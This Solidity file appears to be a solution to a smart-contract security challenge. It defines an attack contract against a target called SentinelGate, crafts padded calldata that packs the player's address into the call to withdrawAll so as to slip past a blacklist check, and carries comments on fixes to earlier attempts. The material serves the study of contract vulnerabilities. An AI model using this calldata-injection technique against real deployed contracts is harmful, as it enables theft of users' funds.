// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "targets/blackout/src/SentinelGate.sol";
import "targets/blackout/src/interfaces/ISentinelGate.sol";

contract blackoutAttack {
    ISentinelGate public target;
    address public player;
    constructor(ISentinelGate _target, address _player) {
        target = _target;
        player = _player;
    }

    function attack() public {
        bytes4 selector = ISentinelGate.withdrawAll.selector;
        bytes4 trick = "1111";
        // Was: 24 bytes not left-padded, EVM zero-extends right pushing address out of low bytes
        // Was: address(this) is the attack contract which has no balance, use player (the deposited+blacklisted address)
        bytes memory seed = abi.encodePacked(bytes8(0), trick, bytes20(uint160(player)));
        bytes memory seed_injection = abi.encodePacked(selector, seed);
        // Was: {data:} is not valid call option, calldata goes in parentheses
        address(target).call(seed_injection);
    }
}